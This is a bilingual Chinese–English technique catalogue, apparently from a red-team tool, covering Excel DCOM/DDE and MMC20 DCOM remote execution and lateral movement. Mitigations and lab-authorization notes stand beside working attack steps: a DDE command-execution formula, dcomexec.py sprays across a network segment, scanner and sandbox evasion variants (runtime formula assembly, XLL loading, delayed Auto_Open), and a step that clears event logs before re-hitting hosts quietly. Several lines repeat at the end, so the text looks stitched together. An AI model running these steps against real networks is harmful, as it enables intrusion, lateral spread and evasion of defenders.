mitigation.zh: 禁用或收紧 Excel/Office COM 的远程激活权限，组策略禁用 DDE 与 DDEGetLinks，主机防火墙将 135 端口限制到管理网段；监控父进程为 DCOM 服务的 EXCEL.EXE 及其子进程。修复后用第 1 步样例回归，远程实例化应被拒绝。
mitigation.en: Disable or tighten remote activation of Excel/Office COM, disable DDE and DDEGetLinks via Group Policy, and restrict port 135 to the management segment with host firewalls; monitor EXCEL.EXE instances whose parent is a DCOM service and their children. After the fix, regress with the step 1 sample: remote instantiation must be denied.

title.zh: 远程激活 Excel 组件

description.zh: 以 ProgID Excel.Application 远程 CreateInstance 并设 Visible=false；无报错即目标 Office DCOM 激活通道可用。
description.en: Remote CreateInstance via GetTypeFromProgID("Excel.Application") with Visible=false; no errors means the Office DCOM activation path works on the target.

description.zh: Workbooks.Add 后写入 =CMD|'/C calc'!A0 公式单元格；目标出现 calc 进程即 DDE 执行链打通，公式可换任意命令。
description.en: After Workbooks.Add, write the =CMD|'/C calc'!A0 formula; calc appearing on the target proves the DDE chain fires, and the formula accepts any command.

description.zh: 用 dcomexec.py -object ShellBrowserWindow 以口令批量登录网段目标；逐台返回命令回显即 DCOM 族横向完成收割。
description.en: Spray the segment with dcomexec.py -object ShellBrowserWindow; command output per host completes the DCOM-family harvest.

analysis.zh: Excel DCOM 激活与 DDE 防护审计只有在精确版本与对象、当前主体、已审查命令输出、权威配置和服务端日志相互一致时才能确认。端口开放、工具成功、权限名称存在、状态码或单一事件只能作为线索；能力证明与漏洞结论必须分别记录。
analysis.en: Excel DCOM Activation and DDE Protection Audit is confirmed only when the exact version and object, current principal, reviewed command output, authoritative configuration, and server-side logs agree. An open port, successful tool run, privilege name, status code, or single event is only a lead; capability proof and vulnerability conclusion must be recorded separately.

opsecTips.zh: 一次只查询一个实验对象并限制结果数量，不保存凭据、哈希、票据、邮箱正文或无关个人数据。
opsecTips.en: Query one lab object at a time with bounded results and do not retain credentials, hashes, tickets, mailbox content, or unrelated personal data.

opsecTips.zh: 发现超出授权的写操作、远程进程、账号变更、防护中断或非实验目标时立即停止，执行回滚并保存审计时间点。
opsecTips.en: Stop immediately, roll back, and preserve the audit timestamp on any write, remote process, account change, protection gap, or non-lab target outside the authorization.

review.rationale: 核对 Excel COM 注册、远程激活权限和 DDE 策略，不启动远程 Excel 或子进程。 该条目保留为具体技术验证卡，保留可复现攻击能力，仅修复不可执行叙述和明显占位符，并补充隔离授权、回滚和蓝队证据要求。

title.zh: DDE 公式编码规避变体

description.zh: 绕过对 =CMD| 公式明文的文档/内存扫描：运行期拼接公式字符串。成功判据：e.txt 生成且静态扫描无完整公式。
description.en: Evades plaintext =CMD| formula scanning in documents/memory by assembling the formula at runtime. Success: e.txt appears with no complete formula for static scans.

description.zh: 绕过 DDE 单元格告警：以 XLL 插件加载路径执行，Excel 内无公式痕迹。成功判据：XLL 被加载执行。
description.en: Evades DDE cell alerts by executing via XLL plugin load, leaving no formula traces in the workbook. Success: the XLL loads and executes.

description.zh: 绕过打开即执行的宏检测沙箱：Auto_Open 设两分钟延迟再触发。成功判据：延迟后动作发生。
description.en: Evades open-and-execute macro sandboxes by having Auto_Open defer two minutes before triggering. Success: the action occurs after the delay.

name.zh: MMC DCOM 激活权限审计

description.zh: MMC DCOM 激活权限审计保留原始可复现技术命令，并将执行范围限定在书面授权、可回滚的隔离实验环境；仅修复明显占位符、纯叙述行和不可执行片段，同时要求关联身份、主机、目录、网络和安全产品证据。
description.en: MMC DCOM Activation-Permission Audit preserves the original reproducible technique commands while restricting execution to a written, reversible, isolated lab authorization. Only obvious placeholders, narrative-only lines, and non-executable fragments are repaired, with identity, host, directory, network, and security-product evidence required.

prerequisites.zh: 确认 MMC DCOM 激活权限审计 的实验域、主机、账号、组件版本和停止条件已书面授权且可回滚。
prerequisites.en: Confirm that the lab domain, host, account, component version, and stop conditions for MMC DCOM Activation-Permission Audit are authorized in writing and reversible.

prerequisites.zh: 准备正常基线、合成对象、唯一标记、回滚快照以及身份、系统和网络日志；任何写入、远程执行或凭据操作都必须属于当前隔离实验授权。
prerequisites.en: Prepare a normal baseline, synthetic object, unique marker, rollback snapshot, and identity, system, and network logs; every write, remote execution, or credential action must be within the current isolated-lab authorization.

overview.zh: MMC DCOM 激活权限审计覆盖 MMC20 COM 远程激活场景：针对持有目标管理员凭据的测试主体，验证能否远程实例化 MMC20.Application 并借 ExecuteShellCommand 执行命令。验证维度涵盖 PowerShell 原生实例化调用与 dcomexec.py 工具化交互执行两条路径。
overview.en: MMC DCOM Activation-Permission Audit covers MMC20 COM remote activation: for a test principal holding the target's administrator credentials, verify whether MMC20.Application can be instantiated remotely and commands executed via ExecuteShellCommand. Verification dimensions cover native PowerShell instantiation and tool-based interactive execution with dcomexec.py.

vulnerability.zh: 根因是 MMC20.Application 注册为可远程激活的 COM 服务器，其 Document.ActiveView 暴露 ExecuteShellCommand 方法；激活与访问权限默认面向管理员组时，凭据复用即可获得无文件落盘的远程命令执行。
vulnerability.en: The root cause is that MMC20.Application registers as a remotely activatable COM server whose Document.ActiveView exposes ExecuteShellCommand; while launch and access permissions default to the Administrators group, credential reuse yields fileless remote command execution.

exploitation.zh: 按 Payload 列表顺序使用：第 1 步用 GetTypeFromProgID 远程实例化 MMC20.Application 并调用 ExecuteShellCommand 启动 calc.exe，目标进程链可见 DCOM 激活来源即确认成功；第 2 步用 dcomexec.py -object MMC20 建立交互式远程命令通道复现同一能力。两条路径均无需向目标写入文件，适合凭据获取后的快速验证。LAB_* 占位符在全局变量菜单中替换为目标值。
exploitation.en: Use in Payload list order: step 1 instantiates MMC20.Application remotely via GetTypeFromProgID and invokes ExecuteShellCommand to start calc.exe — a DCOM-activation origin visible in the target process chain confirms success; step 2 establishes an interactive remote command channel with dcomexec.py -object MMC20 to replay the same capability. Both paths write no files to the target, suiting quick validation after credential capture. Replace LAB_* placeholders via the global variables menu.

mitigation.zh: 禁用或收紧 MMC20.Application 的 DCOM 远程激活与访问权限，主机防火墙将 135 端口限制到管理网段；监控由 DCOM 激活派生的异常子进程（mmc.exe 父进程异常）。修复后用第 1 步样例回归，远程激活应返回拒绝错误。
mitigation.en: Disable or tighten MMC20.Application's DCOM launch and access permissions, and restrict port 135 to the management segment with host firewalls; monitor anomalous child processes derived from DCOM activation. After the fix, regress with the step 1 sample: remote activation must return an access-denied error.

title.zh: 激活 MMC20 并执行命令

description.zh: 远程实例化 MMC20.Application 后调 ExecuteShellCommand 执行 cmd /c whoami；目标出现 cmd 进程或回显即横向链打通。
description.en: Instantiate MMC20.Application remotely and ExecuteShellCommand cmd /c whoami; a cmd process or output on the target completes the lateral chain.

description.zh: 用 dcomexec.py -object MMC20 以口令或哈希登录目标；返回半交互 shell 即免自研脚本、可批量复打域内主机。
description.en: Log in with dcomexec.py -object MMC20 using password or hash; the semi-interactive shell removes custom scripting and scales across domain hosts.

description.zh: 清理 MMC20 相关事件与临时产物，再用第 2 步通道复打开放 DCOM 的主机；控制面扩大的同时保持低暴露。
description.en: Clear MMC20-related events and temp artifacts, then re-hit DCOM-enabled hosts through the step-2 channel; expanding control while staying quiet.

An open port, successful tool run, privilege name, status code, or single event is only a lead; capability proof and vulnerability conclusion must be recorded separately.

opsecTips.en: Query one lab object at a time with bounded results and do not retain credentials, hashes, tickets, mailbox content, or unrelated personal data.

opsecTips.en: Stop immediately, roll back, and preserve the audit timestamp on any write, remote process, account change, protection gap, or non-lab target outside the authorization.
